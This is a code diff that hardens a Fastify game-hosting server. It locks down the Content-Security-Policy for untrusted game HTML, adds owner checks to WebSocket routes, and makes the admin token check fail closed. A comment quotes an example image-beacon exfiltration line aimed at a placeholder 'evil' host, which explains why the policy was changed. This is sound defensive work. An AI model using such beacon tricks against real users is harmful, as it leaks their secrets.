@@ -14,7 +14,7 @@
  */
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { randomUUID } from 'node:crypto';
+import { randomUUID, timingSafeEqual } from 'node:crypto';
 import { rm } from 'node:fs/promises';
 import Fastify, { type FastifyInstance, type FastifyReply, type FastifyRequest } from 'fastify';
 import websocketPlugin from '@fastify/websocket';
@@ -62,6 +62,35 @@ function autoMod(title: string, html: string): string[] {
   }
 
   return flags;
+}
+
+/**
+ * Content-Security-Policy for SERVED, UNTRUSTED game HTML — both the live
+ * `/preview` files and the published `/play` bundles. Generated game code is
+ * untrusted, so this header is the real anti-exfil boundary (plan §7), not a
+ * nicety. One helper so preview and play can never drift apart.
+ *
+ *  - default-src 'none'                  — deny-by-default; only the lines below open.
+ *  - script-src 'unsafe-inline' data: blob: — single-file bundles inline scripts;
+ *                                          'unsafe-eval' is intentionally absent.
+ *  - img-src / media-src 'self' data: blob: — NO wildcard. `img-src *` lets a
+ *      hostile game exfiltrate via an image beacon
+ *      (`new Image().src='https://evil/?'+secret`), silently defeating
+ *      connect-src 'none'. These MUST stay locked to self/data/blob.
+ *  - connect-src 'none'                  — block fetch/XHR/WebSocket/EventSource exfil.
+ */
+function gameContentCsp(frameAncestors: string): string {
+  return [
+    "default-src 'none'",
+    "script-src 'unsafe-inline' data: blob:",
+    "style-src 'unsafe-inline'",
+    "img-src 'self' data: blob:",
+    "media-src 'self' data: blob:",
+    "font-src data:",
+    "worker-src blob:",
+    "connect-src 'none'",
+    `frame-ancestors ${frameAncestors}`,
+  ].join('; ');
 }
 
 /** Minimal payload the API passes to the generation queue. */
@@ -169,20 +198,83 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
     return Number(row?.bal ?? 0);
   }
 
-  async function requireUser(req: FastifyRequest, reply: FastifyReply): Promise<AuthedUser | null> {
+  /**
+   * Extract + authenticate a request's identity. EventSource (SSE) and
+   * WebSocket cannot set custom headers, so a `?token=` (Bearer) or `?userId=`
+   * (dev HeaderAuth) query param is accepted as a fallback. Returns the user or
+   * null — callers decide how to reject (HTTP reply vs. socket close).
+   */
+  async function authenticateRequest(req: FastifyRequest): Promise<AuthedUser | null> {
     const q = req.query as Record<string, string | undefined>;
     const hdrs: Record<string, string | string[] | undefined> = { ...req.headers };
-    // EventSource cannot set custom headers — support ?token= (Bearer) and ?userId= (dev HeaderAuth).
     const qToken = q['token'];
     if (qToken && !hdrs['authorization']) hdrs['authorization'] = `Bearer ${qToken}`;
     const qUserId = q['userId'];
     if (qUserId && !hdrs['x-user-id']) hdrs['x-user-id'] = qUserId;
-    const user = await deps.auth.authenticate(hdrs);
+    return deps.auth.authenticate(hdrs);
+  }
+
+  async function requireUser(req: FastifyRequest, reply: FastifyReply): Promise<AuthedUser | null> {
+    const user = await authenticateRequest(req);
     if (!user) {
       await reply.code(401).send({ error: 'unauthenticated' });
       return null;
     }
     return user;
+  }
+
+  /**
+   * Authenticate a WebSocket upgrade and verify the connecting user owns the
+   * project. There is no project-sharing model yet, so access is owner-only —
+   * the correct closed posture until a collaborators table exists. Closes the
+   * socket (1008 policy violation) and returns null on any failure.
+   */
+  async function authorizeProjectSocket(
+    socket: { close(code?: number, reason?: string): void },
+    req: FastifyRequest,
+    projectId: string,
+  ): Promise<AuthedUser | null> {
+    const user = await authenticateRequest(req);
+    if (!user) {
+      socket.close(1008, 'unauthenticated');
+      return null;
+    }
+    const project = await deps.repo.get(projectId);
+    if (!project || project.ownerId !== user.userId) {
+      socket.close(1008, 'forbidden');
+      return null;
+    }
+    return user;
+  }
+
+  /** Constant-time string compare (utf8). Length mismatch short-circuits — an
+   *  acceptable minor leak for a secret token vs. the timing oracle of `!==`. */
+  function constantTimeEqual(a: string, b: string): boolean {
+    const ab = Buffer.from(a, 'utf8');
+    const bb = Buffer.from(b, 'utf8');
+    if (ab.length !== bb.length) return false;
+    return timingSafeEqual(ab, bb);
+  }
+
+  /**
+   * Gate for admin/moderation routes. FAILS CLOSED: when no ADMIN_TOKEN is
+   * configured the surface is *disabled* (503), never open — an unset token must
+   * never silently mean "everyone is an admin" (the previous `if (deps.adminToken)`
+   * skipped the check entirely when unset). Returns true only on a constant-time
+   * token match; otherwise it has already sent the response.
+   */
+  function requireAdmin(req: FastifyRequest, reply: FastifyReply): boolean {
+    if (!deps.adminToken) {
+      void reply.code(503).send({ error: 'admin_disabled' });
+      return false;
+    }
+    const provided = req.headers['x-admin-token'];
+    const token = Array.isArray(provided) ? provided[0] : provided;
+    if (!token || !constantTimeEqual(token, deps.adminToken)) {
+      void reply.code(403).send({ error: 'forbidden' });
+      return false;
+    }
+    return true;
   }
 
   // ── health ────────────────────────────────────────────────────────────────
@@ -515,19 +607,7 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
         .header('Content-Type', ct)
         .header('Cache-Control', 'no-cache')
         // Apply game CSP to HTML preview files to match the published play route security model.
-        .header('Content-Security-Policy', isHtml
-          ? [
-              "default-src 'none'",
-              "script-src 'unsafe-inline' data: blob:",
-              "style-src 'unsafe-inline'",
-              "img-src * data: blob:",
-              "media-src * data: blob:",
-              "font-src data:",
-              "worker-src blob:",
-              "connect-src 'none'",
-              "frame-ancestors *",
-            ].join('; ')
-          : "default-src 'none'")
+        .header('Content-Security-Policy', isHtml ? gameContentCsp('*') : "default-src 'none'")
         .header('X-Content-Type-Options', 'nosniff')
         .header('Referrer-Policy', 'no-referrer')
         .send(Buffer.from(bytes));
@@ -734,23 +814,11 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
       return reply.code(404).send({ error: 'bundle_not_found' });
     }
 
-    // CSP for self-contained game bundles (engine + assets inlined as data URLs):
-    // • script-src 'unsafe-inline' data: blob: — single-file bundles embed scripts inline
-    //   and may use data:/blob: src; 'unsafe-eval' is intentionally absent
-    // • connect-src 'none' — block all outbound network from game code (anti-exfil)
-    // • frame-ancestors — restrict to configured app origins (default '*' for local dev)
+    // Shared, locked-down game CSP (see gameContentCsp): connect-src 'none' +
+    // non-wildcard img/media so a published game cannot exfiltrate.
+    // frame-ancestors restricts embedding to configured app origins (default '*' for local dev).
     const frameAncestors = deps.allowedFrameOrigins ?? '*';
-    const csp = [
-      "default-src 'none'",
-      "script-src 'unsafe-inline' data: blob:",
-      "style-src 'unsafe-inline'",
-      "img-src * data: blob:",
-      "media-src * data: blob:",
-      "font-src data:",
-      "worker-src blob:",
-      "connect-src 'none'",
-      `frame-ancestors ${frameAncestors}`,
-    ].join('; ');
+    const csp = gameContentCsp(frameAncestors);
 
     return reply
       .header('Content-Type', 'text/html; charset=utf-8')
@@ -1098,8 +1166,11 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
 
   // ── WebSocket co-presence ─────────────────────────────────────────────────
 
-  app.get('/v1/projects/:id/presence', { websocket: true }, (socket, req) => {
+  app.get('/v1/projects/:id/presence', { websocket: true }, async (socket, req) => {
     const { id } = req.params as { id: string };
+    // Authenticate + ownership-check before joining the room. Without this, anyone
+    // who guesses a projectId could enumerate presence on a victim's project.
+    if (!(await authorizeProjectSocket(socket, req, id))) return;
     let sockets = presenceSockets.get(id);
     if (!sockets) {
       sockets = new Set();
@@ -1131,8 +1202,11 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
   // in the same project room. Clients run yjs + WebsocketProvider pointed here.
   // No server-side Y.Doc; late-joiners get state from existing peers via the
   // standard y-websocket sync step1/step2 protocol, which clients handle natively.
-  app.get('/v1/projects/:id/collab', { websocket: true }, (socket, req) => {
+  app.get('/v1/projects/:id/collab', { websocket: true }, async (socket, req) => {
     const { id } = req.params as { id: string };
+    // Authenticate + ownership-check before relaying. Without this, anyone who
+    // guesses a projectId could inject arbitrary Yjs updates into the live document.
+    if (!(await authorizeProjectSocket(socket, req, id))) return;
 
     let room = collabRooms.get(id);
     if (!room) {
@@ -1159,13 +1233,7 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
   // ── admin metrics (autoscaling signal) ────────────────────────────────────
 
   app.get('/v1/admin/metrics', async (req, reply) => {
-    if (deps.adminToken) {
-      const provided = req.headers['x-admin-token'];
-      const token = Array.isArray(provided) ? provided[0] : provided;
-      if (token !== deps.adminToken) {
-        return reply.code(403).send({ error: 'forbidden' });
-      }
-    }
+    if (!requireAdmin(req, reply)) return;
     const presence: Record<string, number> = {};
     for (const [projectId, sockets] of presenceSockets) {
       presence[projectId] = sockets.size;
@@ -1215,14 +1283,8 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
     if (!deps.publishRepo) {
       return reply.code(503).send({ error: 'publish_unavailable' });
     }
-    // Require admin token when configured.
-    if (deps.adminToken) {
-      const provided = req.headers['x-admin-token'];
-      const token = Array.isArray(provided) ? provided[0] : provided;
-      if (token !== deps.adminToken) {
-        return reply.code(403).send({ error: 'forbidden' });
-      }
-    }
+    // Admin gate fails CLOSED (503) when no ADMIN_TOKEN is configured.
+    if (!requireAdmin(req, reply)) return;
     const { slug } = req.params as { slug: string };
     const published = await deps.publishRepo.getBySlug(slug);
     if (!published) {
